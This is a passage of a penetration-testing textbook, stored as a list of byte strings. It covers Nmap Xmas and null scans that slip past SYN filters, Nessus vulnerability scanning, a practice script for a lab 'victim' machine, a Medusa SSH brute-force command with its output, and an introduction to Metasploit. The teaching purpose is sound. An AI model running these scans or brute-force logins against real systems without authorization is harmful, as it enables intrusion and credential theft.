rfcs looking for potential \n', b'weaknesses or loopholes described in the documentation. xmas tree scans and \n', b'null scans exploit just such a loophole.\n', b'xmas tree scans get their name from the fact that the fin, PsH, and Urg \n', b'packet flags are set to \xe2\x80\x9con\xe2\x80\x9d; as a result, the packet has so many flags turned on \n', b'and the packet is often described as being \xe2\x80\x9clit up like a christmas tree.\xe2\x80\x9d given \n', b'what we already know about tcP communications and the three-way hand-\n', b'shake, it should be clear that an xmas tree packet is highly unusual because nei-\n', b'ther the sYn nor Ack flags are set. However, this unusual packet has a purpose. \n', b'if the system we are scanning has followed the tcP rfc implementation, we \n', b'can send one of these unusual packets to determine the current state of the port.\n', b'the tcP rfc says that if a closed port receives a packet that does not have a \n', b'sYn, Ack, or rst flag set (i.e., the type of packet that is created from an xmas \n', b'tree scan), the port should respond with an rst packet of its own. furthermore, \n', b'the rfc states that if the port is open and it receives a packet without a sYn, \n', b'Ack, or rst flag set the packet should be ignored. take a moment to reread the \n', b'last two sentences, as they are critical to understanding the response we get from \n', b'these scans.\n', b'Assuming the operating system of the target fully complies with the tcP rfc, \n', b'nmap is able to determine the port state without completing or even initiating \n', b'a connection on the target system. the word \xe2\x80\x9cassuming\xe2\x80\x9d was used because not \n', b'every operating system on the market today is fully rfc compliant. in general, \n', b'the xmas tree and null scans work against Unix and linux machines but not \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'56\n', b'windows. As a result, xmas tree and null scans are rather ineffective against \n', b'microsoft targets.\n', b'to execute an xmas tree scan, we simply replace the \xe2\x80\x9c-sU\xe2\x80\x9d switch from our last \n', b'example with an \xe2\x80\x9c-sx.\xe2\x80\x9d to run the full scan in the terminal, we would enter:\n', b'nmap \xe2\x80\x93sX -p- -PN 172.16.45.129\n', b'figure 3.5 shows the command and output of an xmas tree scan against a \n', b'linux target.\n', b'Using Nmap to perform Null Scans\n', b'null scans, like xmas tree scans, are probes made with packets that violate tra-\n', b'ditional tcP communication. in many ways, the null scan is the exact oppo-\n', b'site of a xmas tree scan because the null scan utilizes packets that are devoid \n', b'of any flags (completely empty).\n', b'target systems will respond to null scans in the exact same way they respond \n', b'to xmas tree scans. specifically, an open port on the target system will send \n', b'no response back to nmap, whereas a closed port will respond with an rst \n', b'packet. it is important to remember that these scans are only reliable for oper-\n', b'ating systems that comply 100 percent with the tcP rfc.\n', b'one of the main advantages of running xmas tree and null scans is that \n', b'in some cases, you are able to bypass simple filters and Access control lists \n', b'(Acls). some of these primitive filters work by blocking inbound sYn packets. \n', b'the thought with this type of filter is that by preventing the sYn packet from \n', b'entering the system, it is not possible for the three-way handshake to occur. if \n', b'the three-way handshake does not occur, there can be no tcP communication \n', b'streams between the systems, or more precisely, no tcP communications can \n', b'be originated from outside of the filter.\n', b'it is important to understand that neither the xmas tree nor the null scans \n', b'seek to establish any type of communication channel. the whole goal of these \n', b'scans is to determine if a port is open or closed.\n', b'fIGURE 3.5\n', b'Xmas Tree Scan Command and Result.\n', b'\x0cScanning ChApTER 3\n', b'57\n', b'with the previous two paragraphs in mind, consider the following example. \n', b'Assume that our network Admin Ben owned puts a simple firewall in front \n', b'of his system to prevent anyone outside of his network from connecting to \n', b'the system. the firewall works by simply dropping any external communica-\n', b'tions that begin with a sYn packet. Ben hires his buddy, the ethical hacker, to \n', b'scan his system. the ethical hacker\xe2\x80\x99s initial tcP connect scans show nothing. \n', b'However, being a seasoned penetration tester, the ethical hacker follows up his \n', b'initial scan with UdP, xmas tree, and null scans. the ethical hacker smiles \n', b'when he discovers that both his xmas tree scans and null scans reveal open \n', b'ports on Ben\xe2\x80\x99s system.\n', b'this scenario is possible because nmap creates packets without the sYn flag \n', b'set. Because the filter is only dropping incoming packets with the sYn flag, the \n', b'xmas tree and null packets are allowed through. to run a null scan, we issue \n', b'the following command in a terminal:\n', b'nmap \xe2\x80\x93sN -p- -PN 172.16.45.129\n', b'port Scanning Wrap Up\n', b'now that we have covered the basics of port scanning, there are a few addi-\n', b'tional switches that need to be covered. these switches provide additional \n', b'functionality that may be useful to you as you progress in your penetration \n', b'testing career.\n', b'As mentioned earlier, the \xe2\x80\x9c-sV\xe2\x80\x9d switch is used for version scanning. when con-\n', b'ducting version scanning, nmap sends probes to the open port in an attempt \n', b'to determine specific information about the service that is listening. when \n', b'possible, nmap will provide details about the service including version num-\n', b'bers and other banner information. this information should be recorded in \n', b'your notes. it is recommended that you use the \xe2\x80\x9c-sV\xe2\x80\x9d switch whenever possi-\n', b'ble, especially on unusual or unexpected ports, because a wily administrator \n', b'may have moved his web server to port 34567 in an attempt to obscure the \n', b'service.\n', b'nmap includes an option to change the speed of your port scan. this is done \n', b'with the \xe2\x80\x9c-t\xe2\x80\x9d switch. the timing switch ranges on a numeric scale from 0 to 5, \n', b'with 0 being the slowest scan and 5 being the fastest. timing options are useful \n', b'if you are attempting to avoid detection by sending your scan more slowly; or \n', b'if you have a large number of iPs to scan and you have a limited time to com-\n', b'plete the scan where faster scans would be more appropriate. Please be aware \n', b'that by using the fastest scans possible, nmap may provide less accurate results.\n', b'lastly, the \xe2\x80\x9c-o\xe2\x80\x9d switch can be useful for fingerprinting the operating system. \n', b'this is handy for determining if the target you are attacking is a windows, \n', b'linux, or other type of machine. knowing the operating system of your target \n', b'will save you time by allowing you to focus your attacks to known weaknesses \n', b'of that system. there is no use in exploring exploits for a linux machine if your \n', b'target is running windows.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'58\n', b'once we have completed port scanning our target, we should have a list of \n', b'open ports and services. this information should be documented and reviewed \n', b'closely. while reviewing the nmap output, you should take a few moments to \n', b'attempt to log into any remote access services that were discovered in your port \n', b'scan. the next chapter will address running a brute force tool to attempt to log \n', b'in. for the time being, you can attempt to log in using default usernames and \n', b'passwords. You could also try logging in using any information, usernames, or \n', b'e-mail addresses you found during reconnaissance. it is possible to complete a \n', b'penetration test by simply discovering an open remote connection and logging \n', b'into the box with a default username and password. telnet and ssH are great \n', b'remote services that you should always try to connect to. You can do this from \n', b'the command line by typing:\n', b'telnet target_ip\n', b'ssh root@target_ip\n', b'in this example, the \xe2\x80\x9ctarget_ip\xe2\x80\x9d is the iP address of your victim. most likely \n', b'these will fail, but on the rare occasion when you are successful, these are an \n', b'absolute home run.\n', b'vULNERABILITy SCANNING\n', b'now that we have a list of iPs, open ports, and services on each machine, it \n', b'is time to scan the targets for vulnerabilities. A vulnerability is a weakness in \n', b'the software or system configuration that can be exploited. Vulnerabilities \n', b'can come in many forms but most often they are associated with missing \n', b'patches. Vendors often release patches to fix a known problem or vulnerability. \n', b'Unpatched software and systems often lead to quick penetration tests because \n', b'some vulnerabilities allow remote code execution. remote code execution is \n', b'definitely one of the holy grails of hacking.\n', b'it is important to understand this step as the results will feed directly into step \n', b'3 where we will gain access to the system. to scan systems for vulnerabilities, \n', b'we will use a vulnerability scanner. there are several good scanners available to \n', b'you but for this book we will be focusing on nessus.\n', b'nessus is a great tool and available for free, for a home user, from their website. \n', b'You can download a full-fledged version of nessus and get a key for free. if you \n', b'are going to use nessus in a corporate environment, you will need to sign up \n', b'for the Professional feed rather than the Home feed. the Professional feed will \n', b'run you about $100 a month. we will be using the Home version for this book.\n', b'installing nessus is very straightforward. it will run on either linux or windows. \n', b'nessus runs using a client/server architecture. once set up, the server runs quietly \n', b'in the background, and you interact with the server through a browser. to install \n', b'nessus, you need to complete the following steps:\n', b'1. download the installer from www.nessus.org.\n', b'2. register for a key on the nessus website by submitting your e-mail address. \n', b'the nessus crew will e-mail you a unique product key that can be used to \n', b'register the product.\n', b'\x0cScanning ChApTER 3\n', b'59\n', b'3. install the program.\n', b'4. create a nessus user to access the system.\n', b'5. Update the plug-ins.\n', b'one of the key components of nessus is the plug-ins. A plug-in is a small \n', b'block of code that is sent to the target machine to check for a known vulner-\n', b'ability. nessus has literally thousands of plug-ins. these will need to be down-\n', b'loaded the first time you start the program. the default installation will set up \n', b'nessus to automatically update the plug-ins for you.\n', b'once you have installed the nessus server, you can access it by opening a \n', b'browser and entering https://127.0.0.1:8834 in the Url (assuming you are \n', b'accessing nessus on the same computer you installed the server on). do not \n', b'forget the \xe2\x80\x9chttps\xe2\x80\x9d in the Url as nessus uses a secure connection when com-\n', b'municating with the server. You will be prompted with a log-in screen. You \n', b'can use the username and password you created when installing the program. \n', b'once you log into the program, you will be presented with a screen similar to \n', b'figure 3.6.\n', b'Before we can use nessus, we need to set up a scan policy. You can do this \n', b'by clicking on the \xe2\x80\x9cPolicies\xe2\x80\x9d tab at the top of the web page. to set up a scan \n', b'policy, you need to provide a name. if you are going to set up multiple policies, \n', b'you should also enter a description. Please take a minute to review figure 3.6 \n', b'and notice there is a check in the box next to \xe2\x80\x9csafe checks.\xe2\x80\x9d\n', b'when setting up nessus for the first time, it is common to create two  \n', b'policies: one with the \xe2\x80\x9csafe checks\xe2\x80\x9d checked and the other with the \xe2\x80\x9csafe \n', b'checks\xe2\x80\x9d unchecked. the reason for this is simple. some plug-ins and checks \n', b'are considered dangerous because they check for the vulnerability by attempt-\n', b'ing to actually exploit the system. Be aware that removing the \xe2\x80\x9csafe checks\xe2\x80\x9d \n', b'fIGURE 3.6\n', b'Screenshot of Nessus.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'60\n', b'check has the potential to cause network and system disruptions or even take \n', b'systems off-line. By setting up one policy with the \xe2\x80\x9csafe checks\xe2\x80\x9d enabled and \n', b'one with the \xe2\x80\x9csafe checks\xe2\x80\x9d disabled, you can avoid unintentional network \n', b'disruptions.\n', b'there are many options that you can use to customize your scan. for the pur-\n', b'pose of this book, we will use the defaults. take a moment to review the vari-\n', b'ous options by clicking \xe2\x80\x9cnext\xe2\x80\x9d in the lower right. this will take you through \n', b'each of the remaining pages where you can set additional options for your \n', b'scan.\n', b'once your scan is set, you can save it by clicking on the \xe2\x80\x9csubmit\xe2\x80\x9d button that \n', b'will appear after you have reviewed each of the scan option pages. You only \n', b'need to set up your scan policy one time. once your scan has been submitted, \n', b'you will be able to use that policy to perform vulnerability scans against your \n', b'target.\n', b'now that you have a scan policy set up, you can run a scan against your target. \n', b'to set up a scan, you need to click on the \xe2\x80\x9cscans\xe2\x80\x9d link located in the top menu. \n', b'You can enter individual addresses to scan a single target or a list of iPs to scan \n', b'multiple hosts. figure 3.7 shows the \xe2\x80\x9cscan\xe2\x80\x9d screen.\n', b'fIGURE 3.7\n', b'Setting up the Nessus Scan.\n', b'\x0cScanning ChApTER 3\n', b'61\n', b'You need to enter a name for the scan, select a policy, and enter the iP address \n', b'of your targets. You can enter your target iP addresses individually in the \xe2\x80\x9cscan \n', b'targets\xe2\x80\x9d box or if you have your target iP addresses saved to a text file, you can \n', b'use the \xe2\x80\x9cBrowse\xe2\x80\xa6\xe2\x80\x9d button to locate and load it. once your options are set, you \n', b'can click on the \xe2\x80\x9claunch scan\xe2\x80\x9d button in the lower right. nessus will provide \n', b'you with information about the progress of your scan while it is running.\n', b'when nessus finishes the scan, you will be able to review the results by click-\n', b'ing on the \xe2\x80\x9creports\xe2\x80\x9d link in the menu bar. the report will provide you with a \n', b'detailed listing of all the vulnerabilities that nessus discovered. we are espe-\n', b'cially interested in vulnerabilities labeled as High. You should take time to \n', b'closely review the report and make detailed notes about the system. we will \n', b'use these results in the next step to gain access to the system.\n', b'once we have completed port scanning and vulnerability scanning for each  \n', b'of our targets, we should have enough information to begin attacking the \n', b'system.\n', b'hOW DO I pRACTICE ThIS STEp?\n', b'the easiest way to practice port scanning is to set up two machines or use  \n', b'virtual machines. You should work your way through each of the options  \n', b'and scan types that we covered in this chapter. Pay special attention to the out-\n', b'put from each scan. You should run scans against both linux and windows \n', b'boxes.\n', b'You will probably want to add some services or programs to the target system \n', b'so that you can be sure you will have open ports. installing and starting ftP, a \n', b'web server, telnet, or ssH will work nicely.\n', b'when a person is first learning about port scanning, one of the best ways to \n', b'practice is to pick a subnet and hide an iP address in the network. After hid-\n', b'ing the target in the subnet, the goal is to locate the target. once the target has \n', b'been located, the next step is to conduct a full port scan of the system.\n', b'to assist with the scenario described above, a simple script has been created, \n', b'which can be used to \xe2\x80\x9chide\xe2\x80\x9d your system in a given subnet. the code is meant \n', b'to be run on a linux machine. feel free to modify it by changing the iP address \n', b'so that it will work on your network. the script generates a random num-\n', b'ber between 1 and 254. this number is to be used as the final octet in the iP \n', b'address. once the random iP address is created, the script applies the address \n', b'to the machine.\n', b'running this script will allow you to become familiar with the tools and tech-\n', b'niques we covered in this chapter. You can enter the script into a text editor \n', b'and save the file as iP_gen.sh.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'62\n', b'#!/bin/bash\n', b'echo "Setting up the victim machine, this will take just a \n', b'moment..."\n', b'ifconfig eth0 down\n', b'ifconfig eth0 172.16.45.$((( $RANDOM %254) \xee\x80\xb1 1)) up\n', b'# uncomment the following lines by removing the #, to start up \n', b'services on your victim\n', b'# please note, you may need to change the location / path depending \n', b'on your distro\n', b'#/etc/init.d/ssh start\n', b'# note, you may have to generate your SSH key using sshd-generate\n', b'#/etc/init.d/apache2 start\n', b'#/etc/init.d/atftpd start\n', b'echo "This victim machine is now setup."\n', b'echo "The IP address is somewhere in the 172.16.45.0/24 network."\n', b'echo "You may now close this window and begin your attack...Good \n', b'luck!"\n', b'You will need to use a terminal to navigate to the directory where you created \n', b'the file. You need to make the file executable before you can run it. You can do \n', b'this by typing:\n', b'chmod 755 IP_Gen.sh\n', b'to run the script, you type the following command into a terminal:\n', b'./IP_Gen.sh\n', b'the script should run and provide you with a message saying the victim \n', b'machine is all set up. Using the script above you will be able to practice locat-\n', b'ing and scanning a target machine.\n', b'WhERE DO I GO fROM hERE?\n', b'once you have mastered the basics of nmap and nessus, you should dig into \n', b'the advanced options for both tools. this chapter only scratched the surface \n', b'of both of these fine tools. insecure.org is a great resource for learning more \n', b'about nmap. You should dedicate time to exploring and learning all of the var-\n', b'ious switches and options. likewise, nessus has a plethora of additional fea-\n', b'tures. take time to review the various scans and policy options.\n', b'After you are comfortable with the advanced features of these tools, you should \n', b'look at other scanners as well. there are dozens of good port scanners avail-\n', b'able. Pick a few, install them, and learn their features. there are several com-\n', b'mercial products that you should become familiar with; these products are not \n', b'exclusively vulnerability scanners (they are much more), but core impact and \n', b'saint both provide excellent vulnerability assessment components, although \n', b'both of these tools will cost you actual cash.\n', b'\x0cScanning ChApTER 3\n', b'63\n', b'SUMMARy\n', b'this chapter focused on step 2 that consists mainly of scanning. the chapter \n', b'started with a brief overview of pings and ping sweeps before moving into the \n', b'specifics of scanning. the topic of scanning is further broken down into two \n', b'distinct types including port scanning and vulnerability scanning. the port \n', b'scanner nmap was introduced and several different types of scans were dis-\n', b'cussed. Actual examples and outputs of the various scans were demonstrated \n', b'as well as the interpretation of the nmap output. the concept of vulnerability \n', b'scanning was introduced through the use of nessus. Practical examples were \n', b'presented and discussed throughout the chapter.\n', b'\x0cThis page intentionally left blank\n', b'\x0c65\n', b'INTRODUCTION\n', b'exploitation is the process of gaining control over a system. this process can \n', b'take many different forms but for the purpose of this book the end goal always \n', b'remains the same: administrative-level access to the computer. in many ways, \n', b'Exploitation\n', b'ChApTER 4\n', b'Information in This Chapter:\n', b'n Gaining Access to Remote Services with Medusa\n', b'n Metasploit: Hacking Hugh Jackman Style!\n', b'n John the Ripper: King of the Password Crackers\n', b'n Password Resetting: Kind of Like Driving a Bulldozer through the Side of a \n', b'Building\n', b'n Sniffing Network Traffic\n', b'n Macof: Making Chicken Salad Out of Chicken Sh*t\n', b'n Fast-Track Autopwn: Breaking Out the M-60\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'66\n', b'exploitation is the attempt to turn the target machine into a puppet that will \n', b'execute your commands and do your bidding. Just to be clear, exploitation is \n', b'the process of launching an exploit. An exploit is the realization of a vulner-\n', b'ability. exploits are issues or bugs in the software code that allow a hacker or \n', b'attacker to alter the original functionality of the software.\n', b'of all the steps we cover, exploitation is probably the step aspiring hackers \n', b'are most interested in. it certainly gets a lot of attention because this phase \n', b'involves many of the traditional activities that people associate with \xe2\x80\x9chacking\xe2\x80\x9d \n', b'and penetration testing. there are volumes of books that are dedicated to the \n', b'process of exploitation. Unfortunately, there are also volumes of misinforma-\n', b'tion regarding step 3. stories from Hollywood and urban legends of famed \n', b'hacker exploits have tainted the mind of many newcomers. However, this does \n', b'not mean that exploitation is any less exciting or exhilarating. on the contrary, \n', b'exploitation is still my favorite step, even if there is a little less \xe2\x80\x9cshock and awe\xe2\x80\x9d \n', b'than portrayed in a typical hacker movie. But when completed successfully, \n', b'exploitation remains simply breathtaking.\n', b'of all the steps we discuss, exploitation is probably the least well defined and \n', b'most open to interpretation. when combined, these two qualities often bring \n', b'chaos and confusion to people trying to learn penetration testing and hacking. \n', b'the lack of order and structure in a penetration test often leads to frustration \n', b'and failure. it is not uncommon for a novice to read about a new tool, or lis-\n', b'ten to a speaker talk about some advanced technique that can be used to gain \n', b'access to a system, and want to jump directly to step 3 (exploitation). However, \n', b'it is important to remember that penetration testing is more than just exploi-\n', b'tation. fortunately by following the process identified in this book or by any \n', b'other solid penetration testing methodology, you can alleviate many of these \n', b'issues.\n', b'Because this book focuses on the basics, and as a final warning, it is critical to \n', b'stress the importance of completing steps 1 and 2 prior to conducting exploi-\n', b'tation. it can be tempting to bypass reconnaissance and scanning and jump \n', b'directly to chapter 4. that is ok for now, but if you are ever going to advance \n', b'your skills beyond the script kiddie level, you will need to master the other \n', b'steps as well. the failure to do so will not only severely limit your ability to \n', b'grow as a penetration tester but will also eventually stunt your growth as an \n', b'exploitation expert. reconnaissance and scanning will help to bring order and \n', b'direction to exploitation.\n', b'ok. now that the speech is over, let us put away the soapbox and get to the \n', b'business at hand: exploitation. As mentioned earlier, exploitation is the most \n', b'free-flowing phase we will cover. the reason for this is simple; each system is \n', b'different and each target is unique. depending on a multitude of factors, your \n', b'attack vectors will vary from target to target. different operating systems, dif-\n', b'ferent services, and different processes require different types of attacks. skilled \n', b'attackers have to understand the nuances of each system they are attempting \n', b'to exploit. As your skills continue to progress from Padawan to Jedi, you will \n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'67\n', b'need to expand your knowledge of systems and their exploits. eventually, you \n', b'will learn how to create custom exploits.\n', b'You can use the previous step\xe2\x80\x99s output as a guide for where to begin your \n', b'exploitation attempts. the output from scanning should be used to help shape, \n', b'focus, and direct your attacks.\n', b'GAINING ACCESS TO REMOTE SERvICES WITh \n', b'MEDUSA\n', b'when reviewing the output from step 2, always make special notes of iP \n', b'addresses that include some type of remote access service. ssH, telnet, ftP, Pc \n', b'Anywhere, and Vnc are popular choices because gaining access to these ser-\n', b'vices often results in the complete owning of that target. Upon discovery of one \n', b'of these services, hackers typically turn to an \xe2\x80\x9conline password cracker.\xe2\x80\x9d online \n', b'password crackers work by attempting to brute force their way into a system by \n', b'trying an exhaustive list of passwords and/or username combinations.\n', b'when using online password crackers, the potential for success can be greatly \n', b'increased if you combine this attack with information gathered from step 1. \n', b'specifically you should be sure to include any usernames or passwords you \n', b'discovered. the process of online password cracking literally requires the \n', b'attacking program to send a username and a password to the target. if either \n', b'the username or password is incorrect, the attack program will be presented \n', b'with an error message and the log-in will fail. the password cracker will then \n', b'send the next username and password combination. this process continues \n', b'until the program is either successful in finding a login/password combo or \n', b'it exhausts all the guesses. on the whole, even though computers are great at \n', b'repetitive tasks like this, the process is rather slow.\n', b'You should be aware that some remote access systems employ a password \n', b'throttling technique that can limit the number of unsuccessful log-ins you are \n', b'allowed. in these instances either your iP address can be blocked or the user-\n', b'name can be locked out.\n', b'there are many different tools that can be used for online password cracking. \n', b'two of the most popular tools are medusa and Hydra. these tools are very \n', b'similar in nature. in this book, the focus will be on medusa, but it is strongly \n', b'encouraged that you become familiar with Hydra as well.\n', b'medusa is described as a parallel log-in brute forcer that attempts to gain access \n', b'to remote authentication services. medusa is capable of authenticating with \n', b'a large number of remote services including AfP, ftP, HttP, imAP, ms-sQl, \n', b'mysQl, netware ncP, nntP, PcAnywhere, PoP3, rexec, rlogin, smtP-\n', b'AUtH, snmP, ssHv2, telnet, Vnc, web form, and more.\n', b'in order to use medusa, you need several pieces of information including \n', b'the target iP address, a username or username list that you are attempting to \n', b'log in as, a password or dictionary file containing multiple passwords to use  \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'68\n', b'when logging in, and the name of the service you are attempting to authenti-\n', b'cate with.\n', b'one of the requirements listed above is a dictionary list. A password dictionary \n', b'is a file that contains a list of potential passwords. these lists are often referred \n', b'to as dictionaries because they contain thousands or even millions of individual \n', b'words. People often use plain english words or some small variation like a 1 for \n', b'an i, or a 5 for an s when they create passwords. Password lists attempt to collect \n', b'as many of these words as possible. some hackers and penetration testers spend \n', b'years building password dictionaries that grow to gigabytes in size. A good dic-\n', b'tionary can be extremely useful but often requires a lot of time and attention to \n', b'keep clean. clean dictionaries are streamlined and free of duplication.\n', b'there are plenty of small wordlists that can be downloaded from the internet \n', b'and serve as a good starting point for building your own personal password \n', b'dictionary. there are also tools available that will build dictionaries for us. \n', b'However, fortunately, the fine folks at Backtrack have already included a few \n', b'word lists for us to use. You can find these dictionaries in the /pentest/pass-\n', b'words/wordlists directory. there is also a small list included with the John \n', b'the ripper located at: /pentest/passwords/jtr/password.lst.\n', b'once you have your password dictionary, you need to decide if you are going \n', b'to attempt to log in as a single user or if you want to supply a list of potential \n', b'users. if your reconnaissance efforts were rewarded with a list of usernames, \n', b'you may want to start with those. if you were unsuccessful in gathering user-\n', b'names and passwords, you may want to focus on the results of the e-mail \n', b'addresses you collected with the Harvester. remember the first part of an \n', b'e-mail address can often be used to generate a working domain username.\n', b'Assume that during your penetration test you were unable to find any domain \n', b'usernames. However, the Harvester was able to dig up the e-mail address ben.\n', b'owned@example.com. when using medusa, one option is to create a list of \n', b'potential usernames based on the e-mail address. these would include ben.\n', b'owned, benowned, bowned, ownedb, and several other combinations derived \n', b'from the e-mail address. After creating a list of 5\xe2\x80\x9310 usernames, it is possible to \n', b'feed this list into medusa and attempt to brute force my way into the remote \n', b'authentication service.\n', b'now that we have a target iP address with some remote authentication ser-\n', b'vice (we will assume ssH for this example), a password dictionary, and at least \n', b'one username, we are ready to run medusa. in order to execute the attack, you \n', b'open a terminal and issue the following command:\n', b'medusa \xe2\x80\x93h target_ip \xe2\x80\x93u username \xe2\x80\x93P path_to_password_dictionary \xe2\x80\x93M \n', b'authentication_service_to_attack\n', b'take a moment to examine this command in more detail; you will need to cus-\n', b'tomize the information for your target:\n', b'the first keyword \xe2\x80\x9cmedusa\xe2\x80\x9d is used to start the brute forcing program.\n', b'\xe2\x80\x9c-h\xe2\x80\x9d is used to specify the iP address of the target host.\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'69\n', b'the \xe2\x80\x9c-u\xe2\x80\x9d is used to denote a single username that medusa will use to \n', b'attempt log-ins.\n', b'if you generated a list of usernames and would like to attempt to log in \n', b'with each of the names on the list, you can issue a capital \xe2\x80\x9c-U\xe2\x80\x9d followed by \n', b'the path to the username file.\n', b'likewise, the lowercase \xe2\x80\x9c-p\xe2\x80\x9d is used to specify a single password, whereas a \n', b'capital \xe2\x80\x9c-P\xe2\x80\x9d is used to specify an entire list containing multiple passwords. \n', b'the \xe2\x80\x9c-P\xe2\x80\x9d needs to be followed by the actual location or path to the diction-\n', b'ary file.\n', b'the \xe2\x80\x9c-m\xe2\x80\x9d switch is used to specify which service we want to attack.\n', b'to clarify this attack, let us continue with the example we set up earlier. \n', b'suppose we have been hired to conduct a penetration test against the com-\n', b'pany \xe2\x80\x9cexample.com.\xe2\x80\x9d during our information gathering with metagoofil, we \n', b'uncover the username of \xe2\x80\x9cownedb\xe2\x80\x9d and an iP address of 172.16.45.129. After \n', b'port scanning the target, we discover that the server is running ssH on port 22. \n', b'moving to step 3, one of the first things to do is to attempt to brute force our \n', b'way into the server. After firing up Backtrack and opening a terminal, we issue \n', b'the following command:\n', b'medusa \xe2\x80\x93h 172.16.45.129 \xe2\x80\x93u ownedb \xe2\x80\x93P /pentest/passwords/wordlists/\n', b'darkc0de.lst \xe2\x80\x93M ssh\n', b'figure 4.1 shows the command and its associated output.\n', b'fIGURE 4.1\n', b'Using Medusa to Brute Force into SSH.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'70\n', b'the first line shows the command we issued; the second line is an informa-\n', b'tional banner that is displayed when the program begins. the remaining lines \n', b'show a series of log-in attempts with the username \xe2\x80\x9cownedb\xe2\x80\x9d and various pass-\n', b'words beginning with \xe2\x80\x9c[1B].\xe2\x80\x9d notice on the 11th log-in attempt medusa is suc-\n', b'cessful in accessing the system with a username of \xe2\x80\x9cownedb\xe2\x80\x9d and a password of \n', b'\xe2\x80\x9c!power.\xe2\x80\x9d At this point we would be able to remotely log in as the user.\n', b'depending on the level of engagement and goals identified in your authoriza-\n', b'tion and agreement form, you may be done with the penetration test at this \n', b'point. congratulations! You just completed your first penetration test and suc-\n', b'cessfully gained access to a remote system.\n', b'Although it is not always quite that easy, you will be surprised at how many \n', b'times a simple tactic like this works and allows you full access and control of a \n', b'remote system.\n', b'METASpLOIT: hACKING, hUGh JACKMAN STyLE!\n', b'of all the tools discussed in this book, metasploit is my favorite. in many ways, \n', b'it is the quintessential hacker tool. it is powerful, flexible, free, and loaded \n', b'with awesomeness. it is without a doubt the coolest offensive tool covered in \n', b'this book and in some cases it even allows you to hack like Hugh Jackman in \n', b'swordfish! seriously, it is that good. if you ever get a chance to meet Hd moore \n', b'or any of the other original metasploit crew, buy them a beer, shake their hand, \n', b'and say thanks, because metasploit is All that and more.\n', b'in 2004, at defcon 12, Hd moore and spoonm rocked the world when they \n', b'gave a talk titled \xe2\x80\x9cmetasploit: Hacking like in the movies.\xe2\x80\x9d this presentation \n', b'focused on \xe2\x80\x9cexploit frameworks.\xe2\x80\x9d An exploit framework is formal structure for \n', b'developing and launching exploits. frameworks assist the development process \n', b'by providing organization and guidelines for how the various pieces are assem-\n', b'bled and interact with each other.\n', b'metasploit actually started out as a network game, but its full potential was \n', b'realized when it was transformed into a full-fledged exploit tool. metasploit \n', b'actually contains a suite of tools including some great anti-forensics stuff; \n', b'however, the project is probably best known for the metasploit framework \n', b'component.\n', b'ALERT!\n', b'If you are having problems getting Medusa (or any of the tools covered in this book) \n', b'to run on your version of Backtrack, it may be helpful to reinstall the program as we \n', b'discussed in Chapter 1. You can reinstall Medusa with the following commands:\n', b'apt-get update\n', b'apt-get install medusa\n', b'\x0cExploitation ChApTER 4\n', b'71\n', b'Before the release of metasploit, security researchers had two main choices: \n', b'they could develop custom code by piecing together various exploits and pay-\n', b'loads or they could invest in one of the two commercially available exploit \n', b'frameworks, core impact or imunitysec\xe2\x80\x99s cAnVAs. Both impact and cAnVAs \n', b'were great choices and highly successful in their own right. Unfortunately, the \n', b'cost to license and use these products meant many security researchers did not \n', b'have access to them.\n', b'metasploit was different from everything else because for the first time hack-\n', b'ers and penetration testers had access to a truly open source exploit framework. \n', b'this meant that for the first time everyone could access, collaborate, develop, \n', b'and share exploits for free. it also meant that exploits could be developed in an \n', b'almost factory-like assembly line approach. the assembly line approach allowed \n', b'hackers and penetration testers to build exploits based on their own needs.\n', b'metasploit allows you to select the target and choose from a wide variety of \n', b'payloads. the payloads are interchangeable and not tied to a specific exploit. A \n', b'payload is the \xe2\x80\x9cadditional functionality\xe2\x80\x9d or change in behavior that you want \n', b'to accomplish on the target machine. it is the answer to the question: \xe2\x80\x9cwhat \n', b'do i want to do now that i have control of the machine?\xe2\x80\x9d metasploit\xe2\x80\x99s most \n', b'popular payloads include adding new users, opening backdoors, and installing \n', b'new software onto a target machine. the full list of metasploit payloads will be \n', b'covered shortly.\n', b'Before we begin covering the details of how to use metasploit, it is important \n', b'to understand the distinction between metasploit and a vulnerability scanner. \n', b'in most instances, when we use a vulnerability scanner, the scanner will only \n', b'check to see if a system is vulnerable. this occurs in a very passive way with little \n', b'chance of any unintentional damage or disruption to the target. metasploit and \n', b'other frameworks are exploitation tools. these tools do not perform tests; these \n', b'tools are used to complete the actual exploitation of the target. Vulnerability \n', b'scanners look for and report potential weaknesses. metasploit attempts to actu-\n', b'ally exploit the systems it scans. make sure you understand this.\n', b'in 2009, rapid 7 purchased metasploit. Hd moore spent a considerable \n', b'amount of time putting people at ease and reassuring everyone that metasploit \n', b'would remain free. Although several great commercial products have since been \n', b'released including metasploit express and metasploit Pro, Hd has been true to \n', b'his word and the original metasploit project remains free. in fact, the purchase \n', b'of metasploit by rapid 7 has been a huge boost to the metasploit project. the \n', b'open source project is clearly benefitting from the commercial tool push with \n', b'additional full-time developers and staff. the rate at which new exploits and \n', b'functionality is being added is staggering. we will focus on the basics here, but \n', b'you will want to stay on top of latest developments going forward.\n', b'metasploit can be downloaded for free by clicking on the framework link \n', b'located at http://www.metasploit.com. if you are using Backtrack, metasploit \n', b'is already installed for you. there are several different ways to interact with \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'72\n', b'metasploit, but this book will focus on using the menu-driven, non-gUi, \n', b'text-based system called the msfconsole. once you understand the basics, \n', b'the msfconsole is fast, friendly, intuitive, and easy to use. when possible, you \n', b'should avoid the msfweb or msfgui versions especially when first learning.\n', b'we can access the msfconsole by either opening a terminal window and \n', b'entering:\n', b'/pentest/exploits/framework3/msfconsole\n', b'the msfconsole can also be accessed through the menu by clicking on the \n', b'k-start dragon, and navigating to: Backtrack \xe2\x86\x92 Penetration \xe2\x86\x92 metasploit \n', b'exploitation framework \xe2\x86\x92 framework Version 3 \xe2\x86\x92 msfconsole.\n', b'starting the msfconsole takes between 10 and 30 seconds, so do not panic if \n', b'nothing happens for a few moments. eventually metasploit will start by pre-\n', b'senting you with a welcome banner and an 